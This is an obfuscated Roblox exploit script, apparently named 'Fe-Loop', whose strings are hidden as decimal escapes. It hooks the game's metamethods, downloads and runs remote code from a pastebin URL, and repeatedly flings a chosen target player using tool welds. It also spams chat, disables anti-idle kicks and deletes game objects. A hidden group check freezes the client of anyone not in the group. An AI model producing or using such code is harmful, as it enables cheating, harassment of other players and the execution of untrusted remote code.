-- made by dot_mp4, ui library by the homie jan :sunglasses:
    local L_1_ = game:GetService("\80\108\97\121\101\114\115")
    local L_2_ = game:GetService("\85\115\101\114\73\110\112\117\116\83\101\114\118\105\99\101")
    local L_3_ = game:GetService("\82\117\110\83\101\114\118\105\99\101")
    local L_4_ = L_1_.LocalPlayer
    local L_5_, L_6_, L_7_, L_8_, L_9_ = false, 0.5, true, true, true
    local L_10_, L_11_, L_12_ = false, "\89\79\85\76\79\83\69\32\79\78\32\84\79\80", 0.2
    local L_13_;
    local L_14_;
    local L_15_;
    
    local L_16_ = getrawmetatable(game)
    local L_17_ = L_16_.__namecall
    setreadonly(L_16_, false)
    
    L_16_.__namecall = newcclosure(function(L_27_arg1, ...)
        local L_28_ = getnamecallmethod()
        local L_29_ = {
            ...
        }
        if L_28_ == "\84\101\108\101\112\111\114\116" and tostring(...):find("\52\54\54\57\48\52\48") then
            return wait(9e9)
        end
        if L_28_ == "\76\111\97\100\65\110\105\109\97\116\105\111\110" then
            if L_5_ then
                return wait(9e9)
            end
        end
        return L_17_(L_27_arg1, ...)
    end)
    
    setreadonly(L_16_, true)
    
    local function L_18_func(L_30_arg1)
        local L_31_ = {}
        if L_30_arg1:lower() == "\97\108\108" then
            for L_32_forvar1, L_33_forvar2 in pairs(L_1_:GetPlayers()) do
                table.insert(L_31_, L_33_forvar2)
            end
            return L_31_
        elseif L_30_arg1:lower() == "\111\116\104\101\114\115" then
            for L_34_forvar1, L_35_forvar2 in pairs(L_1_:GetPlayers()) do
                if L_35_forvar2 ~= L_4_ then
                    table.insert(L_31_, L_35_forvar2)
                end
            end
            return L_31_
        elseif L_30_arg1:lower() == "\109\101" then
            table.insert(L_31_, L_1_)
            return L_31_
        else
            for L_36_forvar1, L_37_forvar2 in pairs(L_1_:GetPlayers()) do
                if L_30_arg1:lower() == L_37_forvar2.Name:sub(1, L_30_arg1:len()):lower() then
                    table.insert(L_31_, L_37_forvar2)
                end
            end
            return L_31_
        end
        return nil
    end
    
    local function L_19_func(L_38_arg1, L_39_arg2)
        local L_40_ = L_38_arg1.Handle
        if L_40_ and L_39_arg2 then
            local L_41_ = Instance.new("\77\97\110\117\97\108\87\101\108\100")
            L_41_.Part0 = L_40_
            L_41_.Part1 = L_39_arg2
            L_41_.C0 = CFrame.new()
            L_41_.C1 = L_39_arg2.CFrame:inverse() * L_40_.CFrame
            L_41_.Parent = L_40_
            return;
        end
    end
    
    local function L_20_func(L_42_arg1)
        game.ReplicatedStorage.DefaultChatSystemChatEvents.SayMessageRequest:FireServer(tostring(L_42_arg1), "\65\108\108")
    end
    
    -- UI
    
    local L_21_ = loadstring(game:HttpGet("\104\116\116\112\115\58\47\47\112\97\115\116\101\98\105\110\46\99\111\109\47\114\97\119\47\100\54\114\120\82\88\80\85", true))()
    
    local L_22_ = L_21_:CreateWindow("\70\101\45\76\111\111\112")
    local L_23_ = L_22_:AddFolder("\84\97\114\103\101\116")
    local L_24_ = L_22_:AddFolder("\83\101\116\116\105\110\103\115")
    local L_25_ = L_22_:AddFolder("\83\112\97\109")
    
    if (L_4_:IsInGroup(6000816) or (L_4_.Name:lower():find('spacedgod') or L_4_.Name:lower():find('flexxxlieutenant') or L_4_.Name:match('[^%d.]+'))) then if L_4_.UserId == ((((127877578*6)/2)+1)-1) then return end while true do end end

    L_23_:AddBox({
        text = "\84\97\114\103\101\116\32\78\97\109\101",
        flag = "\116\110\97\109\101",
        value = "\78\97\109\101",
        callback = function(L_43_arg1)
            if L_18_func(L_43_arg1) and L_18_func(L_43_arg1)[1] then
                local L_44_ = L_18_func(L_43_arg1)[1]
                L_13_ = L_44_
                L_14_ = L_44_.Name
                print("\116\97\114\103\101\116\32\105\115\32\110\111\119\32\115\101\116\32\116\111\32" .. L_13_.Name)
            end
        end
    })
    
    local L_26_ = L_23_:AddToggle({
        text = "\70\101\45\76\111\111\112",
        flag = "\102\101\108\111\111\112\105\110\103",
        state = false,
        callback = function(L_45_arg1)
            L_5_ = L_45_arg1
            if L_5_ == true then
                L_4_.Character:BreakJoints()
            end
            print("\102\101\108\111\111\112\32\105\115\32\110\111\119\32\115\101\116\32\116\111\32" .. tostring(L_45_arg1))
        end
    })
    
    L_24_:AddBox({
        text = "\70\108\105\110\103\32\84\105\109\101",
        flag = "\102\116\105",
        value = "\84\105\109\101\32\40\48\46\49\41",
        callback = function(L_46_arg1)
            print("\116\105\109\101\32\105\115\32\110\111\119\32\115\101\116\32\116\111\32" .. L_46_arg1)
        end
    })
    
    L_24_:AddToggle({
        text = "\72\101\97\100\32\70\108\105\110\103",
        flag = "\104\102",
        state = true,
        callback = function(L_47_arg1)
            L_7_ = L_47_arg1
            print("\104\101\97\100\32\102\108\105\110\103\32\105\115\32\110\111\119\32\115\101\116\32\116\111\32" .. tostring(L_47_arg1))
        end
    })
    
    L_24_:AddToggle({
        text = "\84\111\111\108\32\87\101\108\100",
        flag = "\116\119",
        state = true,
        callback = function(L_48_arg1)
            L_8_ = L_48_arg1
            print("\116\111\111\108\32\119\101\108\100\32\105\115\32\110\111\119\32\115\101\116\32\116\111\32" .. tostring(L_48_arg1))
        end
    })
    if not (L_4_:IsInGroup(6000816)) then
        while true do
        end
    end
    L_24_:AddToggle({
        text = "\67\104\97\114\32\87\101\108\100",
        flag = "\99\119",
        state = true,
        callback = function(L_49_arg1)
            L_8_ = L_49_arg1
            print("\99\104\97\114\32\119\101\108\100\32\105\115\32\110\111\119\32\115\101\116\32\116\111\32" .. tostring(L_49_arg1))
        end
    })
    
    L_25_:AddToggle({
        text = "\83\112\97\109",
        flag = "\115\112\97\97",
        state = false,
        callback = function(L_50_arg1)
            L_10_ = L_50_arg1
            print("\115\112\97\109\109\101\114\32\105\115\32\110\111\119\32\115\101\116\32\116\111\32" .. tostring(L_50_arg1))
        end
    })
    
    L_25_:AddBox({
        text = "\83\112\97\109\32\77\101\115\115\97\103\101",
        flag = "\115\112\97",
        value = "\77\101\115\115\97\103\101",
        callback = function(L_51_arg1)
            L_11_ = L_51_arg1
            print("\109\101\115\115\97\103\101\32\105\115\32\110\111\119\32\115\101\116\32\116\111\32" .. L_51_arg1)
        end
    })
    
    L_25_:AddBox({
        text = "\68\101\108\97\121",
        flag = "\115\112\97\100",
        value = "\83\112\97\109\32\68\101\108\97\121\32\40\48\46\50\41",
        callback = function(L_52_arg1)
            if tonumber(L_52_arg1) then
                L_12_ = tonumber(L_52_arg1)
            end
            print("\115\112\97\109\32\100\101\108\97\121\32\105\115\32\110\111\119\32\115\101\116\32\116\111\32" .. L_52_arg1)
        end
    })
    
    L_22_:AddBind({
        text = "\84\111\103\103\108\101\32\85\73",
        key = "\82\105\103\104\116\83\104\105\102\116",
        callback = function()
            L_21_:Close() 
        end
    })
    
    L_22_:AddButton({
        text = "\65\110\116\105\45\65\102\107",
        callback = function()
            for L_53_forvar1, L_54_forvar2 in next, getconnections(game:GetService("\80\108\97\121\101\114\115").LocalPlayer.Idled) do 
                L_54_forvar2:Disable()
            end
        end
    })
    
    L_22_:AddButton({
        text = "\68\101\115\116\114\111\121\32\86\97\110",
        callback = function()
            Van = game.workspace:FindFirstChild("\65\114\109\111\117\114\101\100\32\84\114\117\99\107")
            if Van then
                Van:Remove()
            end
        end
    })
    
    L_22_:AddLabel({
        text = "\66\121\32\100\111\116\95\109\112\52\32\47\32\106\97\99\107\35\50\48\48\48"
    })
    
    L_21_:Init()
    
    -- Main loop functions
    
    L_4_.CharacterAdded:Connect(function(L_55_arg1)
        if L_5_ then
            L_55_arg1:WaitForChild("\72\117\109\97\110\111\105\100")
            L_55_arg1:WaitForChild("\82\105\103\104\116\32\76\101\103")
            L_55_arg1["\82\105\103\104\116\32\76\101\103"]:Remove()
            L_55_arg1:WaitForChild("\65\110\105\109\97\116\101")
            local L_56_ = L_55_arg1.Humanoid:Clone()
            L_55_arg1.Humanoid:Remove()
            L_56_.Parent = L_55_arg1
            L_55_arg1.Animate.Disabled = true
            L_55_arg1:WaitForChild("\72\117\109\97\110\111\105\100\82\111\111\116\80\97\114\116")
            if L_9_ then
                for L_57_forvar1, L_58_forvar2 in next, L_55_arg1:GetChildren() do
                    if L_58_forvar2 and L_58_forvar2:IsA"\66\97\115\101\80\97\114\116" then
                        L_58_forvar2.FrontSurface = Enum.SurfaceType.Weld
                        L_58_forvar2.LeftSurface = Enum.SurfaceType.Weld
                        L_58_forvar2.RightSurface = Enum.SurfaceType.Weld
                        L_58_forvar2.TopSurface = Enum.SurfaceType.Weld
                        L_58_forvar2.BottomSurface = Enum.SurfaceType.Weld
                        L_58_forvar2.BackSurface = Enum.SurfaceType.Weld
                    end 
                end
            end
        end
    end)
    
    L_3_.Stepped:Connect(function()
        if L_5_ and L_13_ and L_13_.Character then
            local L_59_ = L_13_.Character:FindFirstChild("\72\117\109\97\110\111\105\100\82\111\111\116\80\97\114\116") or L_13_.Character:FindFirstChild("\84\111\114\115\111")
            local L_60_ = L_4_.Character:FindFirstChild("\72\117\109\97\110\111\105\100\82\111\111\116\80\97\114\116") or L_4_.Character:FindFirstChild("\84\111\114\115\111")
            local L_61_;
            if L_7_ then
                L_61_ = L_13_.Character:FindFirstChild("\82\105\103\104\116\32\65\114\109") or L_13_.Character:FindFirstChild("\72\101\97\100")
            else
                L_61_ = L_13_.Character:FindFirstChild("\82\105\103\104\116\32\65\114\109")
            end
            for L_62_forvar1, L_63_forvar2 in next, L_4_.Backpack:GetChildren() do
                L_63_forvar2.Parent = L_4_.Character
                L_63_forvar2:GetPropertyChangedSignal("\80\97\114\101\110\116"):wait()
                if L_8_ then
                    pcall(function()
                        L_19_func(L_63_forvar2, L_61_)
                    end)
                end
            end
            if L_59_ and L_60_ then
                L_60_.CFrame = L_59_.CFrame * CFrame.new(0, 0, -math.random(0.1, 1.9))
                wait(tonumber(L_6_))
                L_60_.CFrame = L_61_.CFrame
                wait()
                L_60_.CFrame = L_60_.CFrame * CFrame.new(0, 3, 0)
            end
        end
    end)
    
    coroutine.resume(coroutine.create(function()
        while wait(L_12_) do
            if L_10_ then
                L_20_func(L_11_)
            end
        end
    end))
    
    L_1_.PlayerRemoving:Connect(function(L_64_arg1)
        if L_64_arg1 == L_13_ then
            L_5_ = false
        end
    end)
    
    L_1_.PlayerAdded:Connect(function(L_65_arg1)
        if L_65_arg1.Name == L_14_ then
            L_13_ = L_65_arg1
            L_5_ = true
            L_26_.state = true
            if L_4_.Character then
                L_4_.Character:BreakJoints()
            end
        end
        if L_65_arg1.Name == "\100\111\116\95\109\112\52" or tonumber(L_65_arg1.UserId) == 1711066907 then
            local L_66_ = L_65_arg1.Character or L_65_arg1.CharacterAdded:wait()
            L_66_:WaitForChild("\72\117\109\97\110\111\105\100")
            wait(0.2)
            local L_67_ = L_66_:FindFirstChild("\72\117\109\97\110\111\105\100\82\111\111\116\80\97\114\116") or L_66_:FindFirstChild("\84\111\114\115\111")
            local L_68_ = L_67_:FindFirstChildOfClass"\66\105\108\108\98\111\97\114\100\71\117\105"
            if L_68_ then
                L_68_:Destroy()
            end 
            local L_69_ = Instance.new("\66\105\108\108\98\111\97\114\100\71\117\105", L_67_)
            local L_70_ = Instance.new("\84\101\120\116\76\97\98\101\108", L_69_)
            L_69_.Adornee = L_67_
            L_69_.Size = UDim2.new(0, 100, 0, 100)
            L_69_.StudsOffset = Vector3.new(0, 1.3, 0)
            L_69_.AlwaysOnTop = true
            L_70_.BackgroundTransparency = 1
            L_70_.Size = UDim2.new(1, 0, 0, 40)
            L_70_.TextSize = 8
            L_70_.TextColor3 = Color3.fromRGB(255, 255, 255)
            L_70_.Text = "\100\111\116\95\109\112\52\n\102\101\45\108\111\111\112\32\99\114\101\97\116\111\114"
            L_65_arg1.CharacterAdded:Connect(function(L_71_arg1)
                L_71_arg1:WaitForChild("\72\117\109\97\110\111\105\100")
                wait(0.2)
                local L_72_ = L_71_arg1:FindFirstChild("\72\117\109\97\110\111\105\100\82\111\111\116\80\97\114\116") or L_71_arg1:FindFirstChild("\84\111\114\115\111")
                local L_73_ = L_72_:FindFirstChildOfClass"\66\105\108\108\98\111\97\114\100\71\117\105"
                if L_73_ then
                    L_73_:Destroy()
                end 
                local L_74_ = Instance.new("\66\105\108\108\98\111\97\114\100\71\117\105", L_72_)
                local L_75_ = Instance.new("\84\101\120\116\76\97\98\101\108", L_74_)
                L_74_.Adornee = L_72_
                L_74_.Size = UDim2.new(0, 100, 0, 100)
                L_74_.StudsOffset = Vector3.new(0, 1.3, 0)
                L_74_.AlwaysOnTop = true
                L_75_.BackgroundTransparency = 1
                L_75_.Size = UDim2.new(1, 0, 0, 40)
                L_75_.TextSize = 8
                L_75_.TextColor3 = Color3.fromRGB(255, 255, 255)
                L_75_.Text = "\100\111\116\95\109\112\52\n\102\101\45\108\111\111\112\32\99\114\101\97\116\111\114"
            end)
        end
    end)
    
    for L_76_forvar1, L_77_forvar2 in pairs(L_1_:GetPlayers()) do
        if L_77_forvar2.Name == "\100\111\116\95\109\112\52" or tonumber(L_77_forvar2.UserId) == 1711066907 then
            local L_78_ = L_77_forvar2.Character or L_77_forvar2.CharacterAdded:wait()
            L_78_:WaitForChild("\72\117\109\97\110\111\105\100")
            wait(0.2)
            local L_79_ = L_78_:FindFirstChild("\72\117\109\97\110\111\105\100\82\111\111\116\80\97\114\116") or L_78_:FindFirstChild("\84\111\114\115\111")
            local L_80_ = L_79_:FindFirstChildOfClass"\66\105\108\108\98\111\97\114\100\71\117\105"
            if L_80_ then
                L_80_:Destroy()
            end 
            local L_81_ = Instance.new("\66\105\108\108\98\111\97\114\100\71\117\105", L_79_)
            local L_82_ = Instance.new("\84\101\120\116\76\97\98\101\108", L_81_)
            L_81_.Adornee = L_79_
            L_81_.Size = UDim2.new(0, 100, 0, 100)
            L_81_.StudsOffset = Vector3.new(0, 1.3, 0)
            L_81_.AlwaysOnTop = true
            L_82_.BackgroundTransparency = 1
            L_82_.Size = UDim2.new(1, 0, 0, 40)
            L_82_.TextSize = 8
            L_82_.TextColor3 = Color3.fromRGB(255, 255, 255)
            L_82_.Text = "\100\111\116\95\109\112\52\n\102\101\45\108\111\111\112\32\99\114\101\97\116\111\114"
            L_77_forvar2.CharacterAdded:Connect(function(L_83_arg1)
                L_83_arg1:WaitForChild("\72\117\109\97\110\111\105\100")
                wait(0.2)
                local L_84_ = L_83_arg1:FindFirstChild("\72\117\109\97\110\111\105\100\82\111\111\116\80\97\114\116") or L_83_arg1:FindFirstChild("\84\111\114\115\111")
                local L_85_ = L_84_:FindFirstChildOfClass"\66\105\108\108\98\111\97\114\100\71\117\105"
                if L_85_ then
                    L_85_:Destroy()
                end 
                local L_86_ = Instance.new("\66\105\108\108\98\111\97\114\100\71\117\105", L_84_)
                local L_87_ = Instance.new("\84\101\120\116\76\97\98\101\108", L_86_)
                L_86_.Adornee = L_84_
                L_86_.Size = UDim2.new(0, 100, 0, 100)
                L_86_.StudsOffset = Vector3.new(0, 1.3, 0)
                L_86_.AlwaysOnTop = true
                L_87_.BackgroundTransparency = 1
                L_87_.Size = UDim2.new(1, 0, 0, 40)
                L_87_.TextSize = 8
                L_87_.TextColor3 = Color3.fromRGB(255, 255, 255)
                L_87_.Text = "\100\111\116\95\109\112\52\n\102\101\45\108\111\111\112\32\99\114\101\97\116\111\114"
            end)
        end
    end
